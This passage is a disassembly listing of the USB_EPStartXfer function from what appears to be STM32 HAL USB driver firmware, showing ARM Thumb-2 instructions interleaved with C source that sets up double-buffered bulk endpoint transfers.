 8007a22:	f8c7 3090 	str.w	r3, [r7, #144]	; 0x90
 8007a26:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007a2a:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007a2e:	681b      	ldr	r3, [r3, #0]
 8007a30:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007a34:	b29b      	uxth	r3, r3
 8007a36:	461a      	mov	r2, r3
 8007a38:	f8d7 3090 	ldr.w	r3, [r7, #144]	; 0x90
 8007a3c:	4413      	add	r3, r2
 8007a3e:	f8c7 3090 	str.w	r3, [r7, #144]	; 0x90
 8007a42:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007a46:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007a4a:	681b      	ldr	r3, [r3, #0]
 8007a4c:	781b      	ldrb	r3, [r3, #0]
 8007a4e:	00da      	lsls	r2, r3, #3
 8007a50:	f8d7 3090 	ldr.w	r3, [r7, #144]	; 0x90
 8007a54:	4413      	add	r3, r2
 8007a56:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8007a5a:	f8c7 308c 	str.w	r3, [r7, #140]	; 0x8c
 8007a5e:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8007a62:	881b      	ldrh	r3, [r3, #0]
 8007a64:	b29b      	uxth	r3, r3
 8007a66:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8007a6a:	b29a      	uxth	r2, r3
 8007a6c:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8007a70:	801a      	strh	r2, [r3, #0]
 8007a72:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007a76:	2b3e      	cmp	r3, #62	; 0x3e
 8007a78:	d924      	bls.n	8007ac4 <USB_EPStartXfer+0xec2>
 8007a7a:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007a7e:	095b      	lsrs	r3, r3, #5
 8007a80:	f8c7 30e8 	str.w	r3, [r7, #232]	; 0xe8
 8007a84:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007a88:	f003 031f 	and.w	r3, r3, #31
 8007a8c:	2b00      	cmp	r3, #0
 8007a8e:	d104      	bne.n	8007a9a <USB_EPStartXfer+0xe98>
 8007a90:	f8d7 30e8 	ldr.w	r3, [r7, #232]	; 0xe8
 8007a94:	3b01      	subs	r3, #1
 8007a96:	f8c7 30e8 	str.w	r3, [r7, #232]	; 0xe8
 8007a9a:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8007a9e:	881b      	ldrh	r3, [r3, #0]
 8007aa0:	b29a      	uxth	r2, r3
 8007aa2:	f8d7 30e8 	ldr.w	r3, [r7, #232]	; 0xe8
 8007aa6:	b29b      	uxth	r3, r3
 8007aa8:	029b      	lsls	r3, r3, #10
 8007aaa:	b29b      	uxth	r3, r3
 8007aac:	4313      	orrs	r3, r2
 8007aae:	b29b      	uxth	r3, r3
 8007ab0:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007ab4:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007ab8:	b29a      	uxth	r2, r3
 8007aba:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8007abe:	801a      	strh	r2, [r3, #0]
 8007ac0:	f000 bc10 	b.w	80082e4 <USB_EPStartXfer+0x16e2>
 8007ac4:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007ac8:	2b00      	cmp	r3, #0
 8007aca:	d10c      	bne.n	8007ae6 <USB_EPStartXfer+0xee4>
 8007acc:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8007ad0:	881b      	ldrh	r3, [r3, #0]
 8007ad2:	b29b      	uxth	r3, r3
 8007ad4:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007ad8:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007adc:	b29a      	uxth	r2, r3
 8007ade:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8007ae2:	801a      	strh	r2, [r3, #0]
 8007ae4:	e3fe      	b.n	80082e4 <USB_EPStartXfer+0x16e2>
 8007ae6:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007aea:	085b      	lsrs	r3, r3, #1
 8007aec:	f8c7 30e8 	str.w	r3, [r7, #232]	; 0xe8
 8007af0:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007af4:	f003 0301 	and.w	r3, r3, #1
 8007af8:	2b00      	cmp	r3, #0
 8007afa:	d004      	beq.n	8007b06 <USB_EPStartXfer+0xf04>
 8007afc:	f8d7 30e8 	ldr.w	r3, [r7, #232]	; 0xe8
 8007b00:	3301      	adds	r3, #1
 8007b02:	f8c7 30e8 	str.w	r3, [r7, #232]	; 0xe8
 8007b06:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8007b0a:	881b      	ldrh	r3, [r3, #0]
 8007b0c:	b29a      	uxth	r2, r3
 8007b0e:	f8d7 30e8 	ldr.w	r3, [r7, #232]	; 0xe8
 8007b12:	b29b      	uxth	r3, r3
 8007b14:	029b      	lsls	r3, r3, #10
 8007b16:	b29b      	uxth	r3, r3
 8007b18:	4313      	orrs	r3, r2
 8007b1a:	b29a      	uxth	r2, r3
 8007b1c:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8007b20:	801a      	strh	r2, [r3, #0]
 8007b22:	e3df      	b.n	80082e4 <USB_EPStartXfer+0x16e2>
#if (USE_USB_DOUBLE_BUFFER == 1U)
    else
    {
      /* First Transfer Coming From HAL_PCD_EP_Receive & From ISR */
      /* Set the Double buffer counter */
      if (ep->type == EP_TYPE_BULK)
 8007b24:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007b28:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007b2c:	681b      	ldr	r3, [r3, #0]
 8007b2e:	78db      	ldrb	r3, [r3, #3]
 8007b30:	2b02      	cmp	r3, #2
 8007b32:	f040 8218 	bne.w	8007f66 <USB_EPStartXfer+0x1364>
      {
        PCD_SET_EP_DBUF_CNT(USBx, ep->num, ep->is_in, ep->maxpacket);
 8007b36:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007b3a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007b3e:	681b      	ldr	r3, [r3, #0]
 8007b40:	785b      	ldrb	r3, [r3, #1]
 8007b42:	2b00      	cmp	r3, #0
 8007b44:	f040 809d 	bne.w	8007c82 <USB_EPStartXfer+0x1080>
 8007b48:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007b4c:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007b50:	681b      	ldr	r3, [r3, #0]
 8007b52:	f8c7 30ac 	str.w	r3, [r7, #172]	; 0xac
 8007b56:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007b5a:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007b5e:	681b      	ldr	r3, [r3, #0]
 8007b60:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007b64:	b29b      	uxth	r3, r3
 8007b66:	461a      	mov	r2, r3
 8007b68:	f8d7 30ac 	ldr.w	r3, [r7, #172]	; 0xac
 8007b6c:	4413      	add	r3, r2
 8007b6e:	f8c7 30ac 	str.w	r3, [r7, #172]	; 0xac
 8007b72:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007b76:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007b7a:	681b      	ldr	r3, [r3, #0]
 8007b7c:	781b      	ldrb	r3, [r3, #0]
 8007b7e:	00da      	lsls	r2, r3, #3
 8007b80:	f8d7 30ac 	ldr.w	r3, [r7, #172]	; 0xac
 8007b84:	4413      	add	r3, r2
 8007b86:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8007b8a:	f8c7 30a8 	str.w	r3, [r7, #168]	; 0xa8
 8007b8e:	f8d7 30a8 	ldr.w	r3, [r7, #168]	; 0xa8
 8007b92:	881b      	ldrh	r3, [r3, #0]
 8007b94:	b29b      	uxth	r3, r3
 8007b96:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8007b9a:	b29a      	uxth	r2, r3
 8007b9c:	f8d7 30a8 	ldr.w	r3, [r7, #168]	; 0xa8
 8007ba0:	801a      	strh	r2, [r3, #0]
 8007ba2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007ba6:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007baa:	681b      	ldr	r3, [r3, #0]
 8007bac:	691b      	ldr	r3, [r3, #16]
 8007bae:	2b3e      	cmp	r3, #62	; 0x3e
 8007bb0:	d92b      	bls.n	8007c0a <USB_EPStartXfer+0x1008>
 8007bb2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007bb6:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007bba:	681b      	ldr	r3, [r3, #0]
 8007bbc:	691b      	ldr	r3, [r3, #16]
 8007bbe:	095b      	lsrs	r3, r3, #5
 8007bc0:	f8c7 30e4 	str.w	r3, [r7, #228]	; 0xe4
 8007bc4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007bc8:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007bcc:	681b      	ldr	r3, [r3, #0]
 8007bce:	691b      	ldr	r3, [r3, #16]
 8007bd0:	f003 031f 	and.w	r3, r3, #31
 8007bd4:	2b00      	cmp	r3, #0
 8007bd6:	d104      	bne.n	8007be2 <USB_EPStartXfer+0xfe0>
 8007bd8:	f8d7 30e4 	ldr.w	r3, [r7, #228]	; 0xe4
 8007bdc:	3b01      	subs	r3, #1
 8007bde:	f8c7 30e4 	str.w	r3, [r7, #228]	; 0xe4
 8007be2:	f8d7 30a8 	ldr.w	r3, [r7, #168]	; 0xa8
 8007be6:	881b      	ldrh	r3, [r3, #0]
 8007be8:	b29a      	uxth	r2, r3
 8007bea:	f8d7 30e4 	ldr.w	r3, [r7, #228]	; 0xe4
 8007bee:	b29b      	uxth	r3, r3
 8007bf0:	029b      	lsls	r3, r3, #10
 8007bf2:	b29b      	uxth	r3, r3
 8007bf4:	4313      	orrs	r3, r2
 8007bf6:	b29b      	uxth	r3, r3
 8007bf8:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007bfc:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007c00:	b29a      	uxth	r2, r3
 8007c02:	f8d7 30a8 	ldr.w	r3, [r7, #168]	; 0xa8
 8007c06:	801a      	strh	r2, [r3, #0]
 8007c08:	e070      	b.n	8007cec <USB_EPStartXfer+0x10ea>
 8007c0a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007c0e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007c12:	681b      	ldr	r3, [r3, #0]
 8007c14:	691b      	ldr	r3, [r3, #16]
 8007c16:	2b00      	cmp	r3, #0
 8007c18:	d10c      	bne.n	8007c34 <USB_EPStartXfer+0x1032>
 8007c1a:	f8d7 30a8 	ldr.w	r3, [r7, #168]	; 0xa8
 8007c1e:	881b      	ldrh	r3, [r3, #0]
 8007c20:	b29b      	uxth	r3, r3
 8007c22:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007c26:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007c2a:	b29a      	uxth	r2, r3
 8007c2c:	f8d7 30a8 	ldr.w	r3, [r7, #168]	; 0xa8
 8007c30:	801a      	strh	r2, [r3, #0]
 8007c32:	e05b      	b.n	8007cec <USB_EPStartXfer+0x10ea>
 8007c34:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007c38:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007c3c:	681b      	ldr	r3, [r3, #0]
 8007c3e:	691b      	ldr	r3, [r3, #16]
 8007c40:	085b      	lsrs	r3, r3, #1
 8007c42:	f8c7 30e4 	str.w	r3, [r7, #228]	; 0xe4
 8007c46:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007c4a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007c4e:	681b      	ldr	r3, [r3, #0]
 8007c50:	691b      	ldr	r3, [r3, #16]
 8007c52:	f003 0301 	and.w	r3, r3, #1
 8007c56:	2b00      	cmp	r3, #0
 8007c58:	d004      	beq.n	8007c64 <USB_EPStartXfer+0x1062>
 8007c5a:	f8d7 30e4 	ldr.w	r3, [r7, #228]	; 0xe4
 8007c5e:	3301      	adds	r3, #1
 8007c60:	f8c7 30e4 	str.w	r3, [r7, #228]	; 0xe4
 8007c64:	f8d7 30a8 	ldr.w	r3, [r7, #168]	; 0xa8
 8007c68:	881b      	ldrh	r3, [r3, #0]
 8007c6a:	b29a      	uxth	r2, r3
 8007c6c:	f8d7 30e4 	ldr.w	r3, [r7, #228]	; 0xe4
 8007c70:	b29b      	uxth	r3, r3
 8007c72:	029b      	lsls	r3, r3, #10
 8007c74:	b29b      	uxth	r3, r3
 8007c76:	4313      	orrs	r3, r2
 8007c78:	b29a      	uxth	r2, r3
 8007c7a:	f8d7 30a8 	ldr.w	r3, [r7, #168]	; 0xa8
 8007c7e:	801a      	strh	r2, [r3, #0]
 8007c80:	e034      	b.n	8007cec <USB_EPStartXfer+0x10ea>
 8007c82:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007c86:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007c8a:	681b      	ldr	r3, [r3, #0]
 8007c8c:	785b      	ldrb	r3, [r3, #1]
 8007c8e:	2b01      	cmp	r3, #1
 8007c90:	d12c      	bne.n	8007cec <USB_EPStartXfer+0x10ea>
 8007c92:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007c96:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007c9a:	681b      	ldr	r3, [r3, #0]
 8007c9c:	f8c7 30b4 	str.w	r3, [r7, #180]	; 0xb4
 8007ca0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007ca4:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007ca8:	681b      	ldr	r3, [r3, #0]
 8007caa:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007cae:	b29b      	uxth	r3, r3
 8007cb0:	461a      	mov	r2, r3
 8007cb2:	f8d7 30b4 	ldr.w	r3, [r7, #180]	; 0xb4
 8007cb6:	4413      	add	r3, r2
 8007cb8:	f8c7 30b4 	str.w	r3, [r7, #180]	; 0xb4
 8007cbc:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007cc0:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007cc4:	681b      	ldr	r3, [r3, #0]
 8007cc6:	781b      	ldrb	r3, [r3, #0]
 8007cc8:	00da      	lsls	r2, r3, #3
 8007cca:	f8d7 30b4 	ldr.w	r3, [r7, #180]	; 0xb4
 8007cce:	4413      	add	r3, r2
 8007cd0:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8007cd4:	f8c7 30b0 	str.w	r3, [r7, #176]	; 0xb0
 8007cd8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007cdc:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007ce0:	681b      	ldr	r3, [r3, #0]
 8007ce2:	691b      	ldr	r3, [r3, #16]
 8007ce4:	b29a      	uxth	r2, r3
 8007ce6:	f8d7 30b0 	ldr.w	r3, [r7, #176]	; 0xb0
 8007cea:	801a      	strh	r2, [r3, #0]
 8007cec:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007cf0:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007cf4:	681b      	ldr	r3, [r3, #0]
 8007cf6:	f8c7 30a4 	str.w	r3, [r7, #164]	; 0xa4
 8007cfa:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007cfe:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007d02:	681b      	ldr	r3, [r3, #0]
 8007d04:	785b      	ldrb	r3, [r3, #1]
 8007d06:	2b00      	cmp	r3, #0
 8007d08:	f040 809d 	bne.w	8007e46 <USB_EPStartXfer+0x1244>
 8007d0c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007d10:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007d14:	681b      	ldr	r3, [r3, #0]
 8007d16:	f8c7 309c 	str.w	r3, [r7, #156]	; 0x9c
 8007d1a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007d1e:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007d22:	681b      	ldr	r3, [r3, #0]
 8007d24:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007d28:	b29b      	uxth	r3, r3
 8007d2a:	461a      	mov	r2, r3
 8007d2c:	f8d7 309c 	ldr.w	r3, [r7, #156]	; 0x9c
 8007d30:	4413      	add	r3, r2
 8007d32:	f8c7 309c 	str.w	r3, [r7, #156]	; 0x9c
 8007d36:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007d3a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007d3e:	681b      	ldr	r3, [r3, #0]
 8007d40:	781b      	ldrb	r3, [r3, #0]
 8007d42:	00da      	lsls	r2, r3, #3
 8007d44:	f8d7 309c 	ldr.w	r3, [r7, #156]	; 0x9c
 8007d48:	4413      	add	r3, r2
 8007d4a:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8007d4e:	f8c7 3098 	str.w	r3, [r7, #152]	; 0x98
 8007d52:	f8d7 3098 	ldr.w	r3, [r7, #152]	; 0x98
 8007d56:	881b      	ldrh	r3, [r3, #0]
 8007d58:	b29b      	uxth	r3, r3
 8007d5a:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8007d5e:	b29a      	uxth	r2, r3
 8007d60:	f8d7 3098 	ldr.w	r3, [r7, #152]	; 0x98
 8007d64:	801a      	strh	r2, [r3, #0]
 8007d66:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007d6a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007d6e:	681b      	ldr	r3, [r3, #0]
 8007d70:	691b      	ldr	r3, [r3, #16]
 8007d72:	2b3e      	cmp	r3, #62	; 0x3e
 8007d74:	d92b      	bls.n	8007dce <USB_EPStartXfer+0x11cc>
 8007d76:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007d7a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007d7e:	681b      	ldr	r3, [r3, #0]
 8007d80:	691b      	ldr	r3, [r3, #16]
 8007d82:	095b      	lsrs	r3, r3, #5
 8007d84:	f8c7 30e0 	str.w	r3, [r7, #224]	; 0xe0
 8007d88:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007d8c:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007d90:	681b      	ldr	r3, [r3, #0]
 8007d92:	691b      	ldr	r3, [r3, #16]
 8007d94:	f003 031f 	and.w	r3, r3, #31
 8007d98:	2b00      	cmp	r3, #0
 8007d9a:	d104      	bne.n	8007da6 <USB_EPStartXfer+0x11a4>
 8007d9c:	f8d7 30e0 	ldr.w	r3, [r7, #224]	; 0xe0
 8007da0:	3b01      	subs	r3, #1
 8007da2:	f8c7 30e0 	str.w	r3, [r7, #224]	; 0xe0
 8007da6:	f8d7 3098 	ldr.w	r3, [r7, #152]	; 0x98
 8007daa:	881b      	ldrh	r3, [r3, #0]
 8007dac:	b29a      	uxth	r2, r3
 8007dae:	f8d7 30e0 	ldr.w	r3, [r7, #224]	; 0xe0
 8007db2:	b29b      	uxth	r3, r3
 8007db4:	029b      	lsls	r3, r3, #10
 8007db6:	b29b      	uxth	r3, r3
 8007db8:	4313      	orrs	r3, r2
 8007dba:	b29b      	uxth	r3, r3
 8007dbc:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007dc0:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007dc4:	b29a      	uxth	r2, r3
 8007dc6:	f8d7 3098 	ldr.w	r3, [r7, #152]	; 0x98
 8007dca:	801a      	strh	r2, [r3, #0]
 8007dcc:	e069      	b.n	8007ea2 <USB_EPStartXfer+0x12a0>
 8007dce:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007dd2:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007dd6:	681b      	ldr	r3, [r3, #0]
 8007dd8:	691b      	ldr	r3, [r3, #16]
 8007dda:	2b00      	cmp	r3, #0
 8007ddc:	d10c      	bne.n	8007df8 <USB_EPStartXfer+0x11f6>
 8007dde:	f8d7 3098 	ldr.w	r3, [r7, #152]	; 0x98
 8007de2:	881b      	ldrh	r3, [r3, #0]
 8007de4:	b29b      	uxth	r3, r3
 8007de6:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007dea:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007dee:	b29a      	uxth	r2, r3
 8007df0:	f8d7 3098 	ldr.w	r3, [r7, #152]	; 0x98
 8007df4:	801a      	strh	r2, [r3, #0]
 8007df6:	e054      	b.n	8007ea2 <USB_EPStartXfer+0x12a0>
 8007df8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007dfc:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007e00:	681b      	ldr	r3, [r3, #0]
 8007e02:	691b      	ldr	r3, [r3, #16]
 8007e04:	085b      	lsrs	r3, r3, #1
 8007e06:	f8c7 30e0 	str.w	r3, [r7, #224]	; 0xe0
 8007e0a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007e0e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007e12:	681b      	ldr	r3, [r3, #0]
 8007e14:	691b      	ldr	r3, [r3, #16]
 8007e16:	f003 0301 	and.w	r3, r3, #1
 8007e1a:	2b00      	cmp	r3, #0
 8007e1c:	d004      	beq.n	8007e28 <USB_EPStartXfer+0x1226>
 8007e1e:	f8d7 30e0 	ldr.w	r3, [r7, #224]	; 0xe0
 8007e22:	3301      	adds	r3, #1
 8007e24:	f8c7 30e0 	str.w	r3, [r7, #224]	; 0xe0
 8007e28:	f8d7 3098 	ldr.w	r3, [r7, #152]	; 0x98
 8007e2c:	881b      	ldrh	r3, [r3, #0]
 8007e2e:	b29a      	uxth	r2, r3
 8007e30:	f8d7 30e0 	ldr.w	r3, [r7, #224]	; 0xe0
 8007e34:	b29b      	uxth	r3, r3
 8007e36:	029b      	lsls	r3, r3, #10
 8007e38:	b29b      	uxth	r3, r3
 8007e3a:	4313      	orrs	r3, r2
 8007e3c:	b29a      	uxth	r2, r3
 8007e3e:	f8d7 3098 	ldr.w	r3, [r7, #152]	; 0x98
 8007e42:	801a      	strh	r2, [r3, #0]
 8007e44:	e02d      	b.n	8007ea2 <USB_EPStartXfer+0x12a0>
 8007e46:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007e4a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007e4e:	681b      	ldr	r3, [r3, #0]
 8007e50:	785b      	ldrb	r3, [r3, #1]
 8007e52:	2b01      	cmp	r3, #1
 8007e54:	d125      	bne.n	8007ea2 <USB_EPStartXfer+0x12a0>
 8007e56:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007e5a:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007e5e:	681b      	ldr	r3, [r3, #0]
 8007e60:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007e64:	b29b      	uxth	r3, r3
 8007e66:	461a      	mov	r2, r3
 8007e68:	f8d7 30a4 	ldr.w	r3, [r7, #164]	; 0xa4
 8007e6c:	4413      	add	r3, r2
 8007e6e:	f8c7 30a4 	str.w	r3, [r7, #164]	; 0xa4
 8007e72:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007e76:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007e7a:	681b      	ldr	r3, [r3, #0]
 8007e7c:	781b      	ldrb	r3, [r3, #0]
 8007e7e:	00da      	lsls	r2, r3, #3
 8007e80:	f8d7 30a4 	ldr.w	r3, [r7, #164]	; 0xa4
 8007e84:	4413      	add	r3, r2
 8007e86:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8007e8a:	f8c7 30a0 	str.w	r3, [r7, #160]	; 0xa0
 8007e8e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007e92:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007e96:	681b      	ldr	r3, [r3, #0]
 8007e98:	691b      	ldr	r3, [r3, #16]
 8007e9a:	b29a      	uxth	r2, r3
 8007e9c:	f8d7 30a0 	ldr.w	r3, [r7, #160]	; 0xa0
 8007ea0:	801a      	strh	r2, [r3, #0]

        /* Coming from ISR */
        if (ep->xfer_count != 0U)
 8007ea2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007ea6:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007eaa:	681b      	ldr	r3, [r3, #0]
 8007eac:	69db      	ldr	r3, [r3, #28]
 8007eae:	2b00      	cmp	r3, #0
 8007eb0:	f000 8218 	beq.w	80082e4 <USB_EPStartXfer+0x16e2>
        {
          /* update last value to check if there is blocking state */
          wEPVal = PCD_GET_ENDPOINT(USBx, ep->num);
 8007eb4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007eb8:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007ebc:	681a      	ldr	r2, [r3, #0]
 8007ebe:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007ec2:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007ec6:	681b      	ldr	r3, [r3, #0]
 8007ec8:	781b      	ldrb	r3, [r3, #0]
 8007eca:	009b      	lsls	r3, r3, #2
 8007ecc:	4413      	add	r3, r2
 8007ece:	881b      	ldrh	r3, [r3, #0]
 8007ed0:	f8a7 3096 	strh.w	r3, [r7, #150]	; 0x96

          /*Blocking State */
          if ((((wEPVal & USB_EP_DTOG_RX) != 0U) && ((wEPVal & USB_EP_DTOG_TX) != 0U)) ||
 8007ed4:	f8b7 3096 	ldrh.w	r3, [r7, #150]	; 0x96
 8007ed8:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 8007edc:	2b00      	cmp	r3, #0
 8007ede:	d005      	beq.n	8007eec <USB_EPStartXfer+0x12ea>
 8007ee0:	f8b7 3096 	ldrh.w	r3, [r7, #150]	; 0x96
 8007ee4:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8007ee8:	2b00      	cmp	r3, #0
 8007eea:	d10d      	bne.n	8007f08 <USB_EPStartXfer+0x1306>
              (((wEPVal & USB_EP_DTOG_RX) == 0U) && ((wEPVal & USB_EP_DTOG_TX) == 0U)))
 8007eec:	f8b7 3096 	ldrh.w	r3, [r7, #150]	; 0x96
 8007ef0:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
          if ((((wEPVal & USB_EP_DTOG_RX) != 0U) && ((wEPVal & USB_EP_DTOG_TX) != 0U)) ||
 8007ef4:	2b00      	cmp	r3, #0
 8007ef6:	f040 81f5 	bne.w	80082e4 <USB_EPStartXfer+0x16e2>
              (((wEPVal & USB_EP_DTOG_RX) == 0U) && ((wEPVal & USB_EP_DTOG_TX) == 0U)))
 8007efa:	f8b7 3096 	ldrh.w	r3, [r7, #150]	; 0x96
 8007efe:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8007f02:	2b00      	cmp	r3, #0
 8007f04:	f040 81ee 	bne.w	80082e4 <USB_EPStartXfer+0x16e2>
          {
            PCD_FREE_USER_BUFFER(USBx, ep->num, 0U);
 8007f08:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007f0c:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007f10:	681a      	ldr	r2, [r3, #0]
 8007f12:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007f16:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007f1a:	681b      	ldr	r3, [r3, #0]
 8007f1c:	781b      	ldrb	r3, [r3, #0]
 8007f1e:	009b      	lsls	r3, r3, #2
 8007f20:	4413      	add	r3, r2
 8007f22:	881b      	ldrh	r3, [r3, #0]
 8007f24:	b29b      	uxth	r3, r3
 8007f26:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8007f2a:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8007f2e:	f8a7 3094 	strh.w	r3, [r7, #148]	; 0x94
 8007f32:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007f36:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007f3a:	681a      	ldr	r2, [r3, #0]
 8007f3c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007f40:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007f44:	681b      	ldr	r3, [r3, #0]
 8007f46:	781b      	ldrb	r3, [r3, #0]
 8007f48:	009b      	lsls	r3, r3, #2
 8007f4a:	441a      	add	r2, r3
 8007f4c:	f8b7 3094 	ldrh.w	r3, [r7, #148]	; 0x94
 8007f50:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8007f54:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8007f58:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8007f5c:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 8007f60:	b29b      	uxth	r3, r3
 8007f62:	8013      	strh	r3, [r2, #0]
 8007f64:	e1be      	b.n	80082e4 <USB_EPStartXfer+0x16e2>
          }
        }
      }
      /* iso out double */
      else if (ep->type == EP_TYPE_ISOC)
 8007f66:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007f6a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007f6e:	681b      	ldr	r3, [r3, #0]
